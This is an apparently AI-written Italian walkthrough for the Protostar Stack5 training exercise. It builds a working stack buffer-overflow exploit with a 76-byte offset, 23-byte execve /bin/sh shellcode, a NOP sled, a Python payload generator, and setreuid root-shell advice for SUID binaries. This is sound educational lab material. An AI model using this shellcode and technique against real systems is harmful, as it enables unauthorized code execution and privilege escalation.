Di seguito trovi un percorso *passo‑passo* (con comandi pronti) per risolvere **Protostar – Stack5** eseguendo shellcode tramite overflow di buffer.

---

## 0) Contesto (cosa stiamo sfruttando)

* Il binario vulnerabile è in **`/opt/protostar/bin/stack5`** e la pagina dell’esercizio fornisce anche gli *hints* (usare shellcode altrui, `\xcc` per debuggare). ([exploit.education][1])
* Su Protostar **ASLR e NX sono disabilitati**, quindi la *stack* è eseguibile e gli indirizzi sono stabili (utile per posizionare il salto). ([exploit.education][2])
* Il sorgente è minimale: buffer da 64 byte e `gets(buffer);`, quindi overflow sicuro. ([exploit.education][1])

---

## 1) Trova l’offset fino all’EIP

Nel frame di `main`, l’EIP salvato viene sovrascritto dopo i 64 byte di `buffer` + 12 byte (EBP e allineamenti): **in pratica a 76 byte**. Puoi verificarlo velocemente:

```bash
gdb -q /opt/protostar/bin/stack5
# (opzionale) stile Intel
(gdb) disas main
(gdb) r < <(python -c 'print "A"*76')     # con Python2
# oppure:
(gdb) r < <(python3 - <<'PY'
import sys; sys.stdout.buffer.write(b"A"*76)
PY
)
```

Con 76 ‘A’ il programma va in **SIGSEGV**: è il segnale che hai il controllo dell’EIP. Un write‑up mostra proprio che a 76 byte il processo crascia (e come abilita i core dump per ispezionare lo stack). ([DEV Community][3])

> Nota: invece della “conta” manuale, puoi anche usare un pattern/cyclic e poi `cyclic_find`, ma per Stack5 76 è il valore che troverai. ([kevindoubleu.github.io][4])

---

## 2) Scegli uno **shellcode** affidabile (/bin/sh)

Per x86 a 32 bit va benissimo il classico `execve("/bin/sh")` (23 byte), ad esempio questo (Shell‑Storm/Exploit‑DB):

```text
\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xB0\x0b\xcd\x80
```

(23 byte) ([shell-storm.org][5], [Exploit Database][6])

> Se vuoi **garantire i privilegi root** quando il binario è SUID, usa uno shellcode che fa prima `setreuid(0,0)` e poi `execve("/bin/sh")` (33 byte). ([Exploit Database][7])

---

## 3) Strategia di salto: “ret‑into‑sled” *dopo* l’EIP

È la via più semplice e robusta in Protostar:

1. **Metti una NOP sled e lo shellcode *dopo* l’EIP** (cioè nei byte che seguono la return address sovrascritta).
2. **Sovrascrivi l’EIP** con l’**indirizzo** che **punta dentro la NOP sled**.

Per ricavare l’indirizzo preciso:

```bash
(gdb) disas main
# troverai il ret a un indirizzo tipo 0x080483da (dipende dalla build)
(gdb) b *0x080483da
(gdb) r
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
(gdb) x/8wx $esp
```

A quel breakpoint, la word a `$esp` contiene `TTTT` (l’EIP salvato corrotto), e **`$esp+4`** contiene `UUUU` (il primo dword *dopo* l’EIP). Scegli quell’**indirizzo di `$esp+4`** come target: ci faremo atterrare il salto dentro la NOP sled che metteremo subito dopo l’EIP. Un write‑up mostra esattamente questa tecnica con gli stessi marker (“TTTT”, “UUUU”). ([kevindoubleu.github.io][4])

---

## 4) (Opzionale) Usa `\xcc` per confermare il salto

Gli *hint* ufficiali suggeriscono di usare `\xcc` (INT3) per “fermare” lanciando un **SIGTRAP** se l’EIP atterra dove vuoi. Metti qualche `\xcc` al posto della sled/shellcode per provare in `gdb`, poi rimuovili nella versione finale. ([exploit.education][1])

---

## 5) Costruisci il **payload** (Python 3)

**Sostituisci `RET_ADDR` con l’indirizzo che hai letto in gdb (di solito `$esp+4` al breakpoint sul `ret`)**:

```bash
python3 - <<'PY' > payload
import struct, sys

offset = 76  # bytes fino all'EIP
ret_addr = 0xBFFFF7B0  # <-- METTI QUI l'indirizzo che hai trovato (esempio: $esp+4)
nop     = b"\x90" * 200

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53"
             b"\x89\xe1\x99\xb0\x0b\xcd\x80")

payload = b"A"*offset + struct.pack("<I", ret_addr) + nop + shellcode
sys.stdout.buffer.write(payload)
PY
```

L’idea (molto usata nei write‑up) è identica al seguente esempio reale: 76 ‘A’, return address che punta dentro la sled posizionata **dopo** l’EIP, e poi lo shellcode per `/bin/sh`. ([DEV Community][3])

> Se vuoi prima fare la prova con `\xcc`, sostituisci `shellcode = b"\xcc"*4` e lancia dentro `gdb`: dovresti vedere **SIGTRAP** quando il salto riesce (come suggerito dagli hint). ([exploit.education][1])

---

## 6) Esegui ed ottieni la shell (mantenendo STDIN aperto)

Per avere una shell interattiva via pipe, usa il “trucco del **cat**” per tenere aperto lo **stdin**:

```bash
# Variante interattiva
( cat payload; cat ) | /opt/protostar/bin/stack5
# ora digita comandi, es.:
id
```

Questo schema è mostrato anche in una guida a Stack5 (mantiene vivo lo stdin per interagire con la shell appena eseguita). ([noobfromPitt][8])

Se vuoi verificare al volo senza interattività:

```bash
cat payload | /opt/protostar/bin/stack5
```

---

## 7) Perché funziona (riassunto)

* `gets()` scrive oltre i 64 byte di `buffer`, sovrascrivendo **EBP** e poi la **return address**.
* Con 76 byte arriviamo a controllare l’EIP. (Mostrato in analisi e write‑up.) ([DEV Community][3], [kevindoubleu.github.io][4])
* Iniettiamo **NOP sled + shellcode** nello stack e facciamo puntare l’EIP dentro la sled: la CPU scivola (“sled”) fino allo shellcode e **esegue `/bin/sh`**. (Shellcode standard 23B.) ([shell-storm.org][5])
* Su Protostar la **stack è eseguibile** e **ASLR è off**, quindi la tecnica “ret‑into‑stack” funziona senza ROP. ([exploit.education][2])

---

## 8) Note pratiche / troubleshooting

* **Indirizzi leggermente diversi dentro/fuori gdb**: capita per differenze d’ambiente. Se noti mismatch, aumenta la NOP sled (es. 400–800 byte) o prendi un indirizzo un po’ più “nel mezzo” dei tuoi NOP. Un post mostra che bastano *sled* di qualche decina/centinaio di byte per assorbire gli scostamenti. ([Stack Overflow][9])
* **SUID e privilegi**: se la shell dovesse *droppare* privilegi, usa lo shellcode con `setreuid(0,0)` prima di `execve`. ([Exploit Database][7])
* **Debug con core**: se vuoi analizzare i crash dei SUID, abilita i core dump come nell’esempio ( `ulimit -c unlimited` e `printf 1 > /proc/sys/fs/suid_dumpable` ) per poi aprire il core in gdb. ([DEV Community][3])

---

### Riferimenti che ho usato

* Pagina ufficiale “Stack Five” (per percorso del binario e *hints*). ([exploit.education][1])
* Pagina principale di Protostar (spiega che **NX/ASLR sono disabilitati**). ([exploit.education][2])
* Write‑up con conferma dell’**offset 76**, breakpoint su `ret` e strategia “salta nel post‑EIP”. ([DEV Community][3], [kevindoubleu.github.io][4])
* Shellcode `/bin/sh` (23 byte). ([shell-storm.org][5])
* Shellcode `setreuid(0,0) + /bin/sh` (33 byte) per SUID. ([Exploit Database][7])

Se vuoi, posso aiutarti a ricavare **l’indirizzo esatto** dal tuo gdb (incollami l’output di `x/8wx $esp` al breakpoint sul `ret`) e ti preparo il payload con il `ret_addr` già corretto per la tua VM. 💪🏻

[1]: https://exploit.education/protostar/stack-five/ "Stack Five :: Andrew Griffiths' Exploit Education"
[2]: https://exploit.education/protostar/?utm_source=chatgpt.com "Protostar :: Andrew Griffiths' Exploit Education"
[3]: https://dev.to/hextrace/jump-into-local-shellcode-protostar-stack5-57mb "Jump into shellcode (protostar - stack5) - DEV Community"
[4]: https://kevindoubleu.github.io/writeups/exploit-education/protostar/stack/stack5/ "
        
            Protostar - stack5 - doubleu
        
    "
[5]: https://shell-storm.org/shellcode/files/shellcode-827.php?utm_source=chatgpt.com "Linux/x86 - execve /bin/sh shellcode - 23 bytes - Shell-Storm.org"
[6]: https://www.exploit-db.com/exploits/37384?utm_source=chatgpt.com "Linux/x86 - execve(/bin/sh) Shellcode (23 bytes) (1) - Exploit-DB"
[7]: https://www.exploit-db.com/exploits/13379?utm_source=chatgpt.com "Linux/x86 - setreuid(0,0) + execve(\"/bin/sh\", [\"/bin/sh\", NULL ..."
[8]: https://noobfrompitt.github.io/protostar-stack5/ "Protostar stack5 walkthrough - noobfromPitt"
[9]: https://stackoverflow.com/questions/72487665/how-i-can-get-this-memory-address-in-protostar-stack-5-ctf?utm_source=chatgpt.com "How i can get this memory address in Protostar stack 5 CTF"
